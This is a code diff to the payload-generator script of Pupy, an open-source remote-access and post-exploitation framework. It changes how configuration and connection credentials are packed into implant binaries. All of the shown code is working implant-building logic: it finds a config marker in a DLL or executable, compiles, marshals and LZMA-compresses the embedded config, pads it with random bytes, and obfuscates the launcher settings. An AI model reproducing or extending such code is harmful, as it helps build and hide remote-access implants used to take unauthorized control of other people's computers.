@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python -O
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
@@ -14,13 +14,20 @@ from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 from modules.lib.windows.powershell_upload import obfuscatePowershellScript
+from pupylib.PupyCredentials import Credentials
+
+import marshal
 import scriptlets
 import cPickle
 import base64
 import os
+import pylzma
+import struct
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
+if __name__ == '__main__':
+    Credentials.DEFAULT_ROLE = 'CLIENT'
 
 def get_edit_pupyx86_dll(conf, debug=False):
     if debug:
@@ -70,81 +77,89 @@ def get_edit_binary(path, conf):
     i=0
     offsets=[]
     while True:
-        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
+        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n", i+1)
         if i==-1:
             break
         offsets.append(i)
 
     if not offsets:
         raise Exception("Error: the offset to edit the config have not been found")
-    elif len(offsets)!=1:
+    elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf=get_raw_conf(conf, obfuscate=True)
-    new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
-    if len(new_conf)>40960-1:
-        raise Exception("Error: config or offline script too long (%s/40960 bytes)\nYou need to recompile the dll with a bigger buffer"%len(new_conf))
-    binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
+    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<string>', 'exec'))
+    uncompressed = len(new_conf)
+    new_conf = pylzma.compress(new_conf)
+    compressed = len(new_conf)
+    new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
+    new_conf_len = len(new_conf)
+
+    if new_conf_len > 8192:
+        raise Exception(
+            'Error: config or offline script too long ({}/8192 bytes)'
+            'You need to recompile the dll with a bigger buffer'.format(new_conf_len)
+        )
+
+    new_conf = new_conf + os.urandom(8192-new_conf_len)
+
+    offset = offsets[0]
+    binary = binary[0:offset]+new_conf+binary[offset+8192:]
     return binary
 
-def get_credential(name):
-    credentials = Credentials()
-    return credentials[name]
-
 def get_raw_conf(conf, obfuscate=False):
+    credentials = Credentials(role='client')
+
     if not "offline_script" in conf:
         offline_script=""
     else:
         offline_script=conf["offline_script"]
-    new_conf=""
+
     obf_func=lambda x:x
     if obfuscate:
         obf_func=compress_encode_obfs
 
-
-    l=launchers[conf['launcher']]()
+    l = launchers[conf['launcher']]()
     l.parse_args(conf['launcher_args'])
-    t=transports[l.get_transport()]
 
-    #pack credentials
-    creds_src=open("crypto/credentials.py","r").read()
-    creds={}
-    exec creds_src in {}, creds
-    cred_src=b""
-    creds_list=t.credentials
-    if conf['launcher']=="bind":
-        creds_list.append("BIND_PAYLOADS_PASSWORD")
+    required_credentials = set(l.credentials) \
+      if hasattr(l, 'credentials') else set([])
 
-    if conf['launcher']!="bind": #TODO more flexible warning handling
-        if "SSL_BIND_KEY" in creds_list:
-            creds_list.remove("SSL_BIND_KEY")
-        if "SSL_BIND_CERT" in creds_list:
-            creds_list.remove("SSL_BIND_CERT")
+    transport = l.get_transport()
+    if transport and transports[transport].credentials:
+        for name in transports[transport].credentials:
+            required_credentials.add(name)
+    elif not transport:
+        for t in transports.itervalues():
+            if t.credentials:
+                for name in t.credentials:
+                    required_credentials.add(name)
 
-    for c in creds_list:
-        if c in creds:
-            print colorize("[+] ", "green")+"Embedding credentials %s"%c
-            cred_src+=obf_func("%s=%s"%(c, repr(creds[c])))+"\n"
-        else:
-            print colorize("[!] ", "yellow")+"[-] Credential %s have not been found for transport %s. Fall-back to default credentials. You should edit your crypto/credentials.py file"%(c, l.get_transport())
-    pupy_credentials_mod={"pupy_credentials.py" : cred_src}
+    print colorize("[+] ", "green") + 'Required credentials:\n{}'.format(
+        '\n'.join([ colorize("[+] ", "green") + x for x in required_credentials])
+    )
 
-    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
+    embedded_credentials = '\n'.join([
+        '{}={}'.format(credential, repr(credentials[credential])) \
+        for credential in required_credentials if credentials[credential] is not None
+    ])+'\n'
 
-    #pack custom transport conf:
-    l.get_transport()
-    transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
-    #add custom transport and reload network conf
-    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"
+    config = '\n'.join([
+        'pupyimporter.pupy_add_package({})'.format(
+            repr(cPickle.dumps({
+                'pupy_credentials.py' : embedded_credentials
+            }))),
+        'pupyimporter.pupy_add_package({})'.format(
+            repr(cPickle.dumps(gen_package_pickled_dic(
+                ROOT+os.sep, 'network.transports.{}'.format(l.get_transport())
+            )))) if transport else '',
+        'import sys',
+        'sys.modules.pop("network.conf")',
+        'import network.conf',
+        'LAUNCHER={}'.format(repr(conf['launcher'])),
+        'LAUNCHER_ARGS={}'.format(repr(conf['launcher_args'])),
+    ])
 
-
-    new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
-    new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
-    new_conf+=offline_script
-    new_conf+="\n"
-
-    return new_conf
-
+    return obf_func(config)
 
 def updateZip(zipname, filename, data):
     # generate a temp file
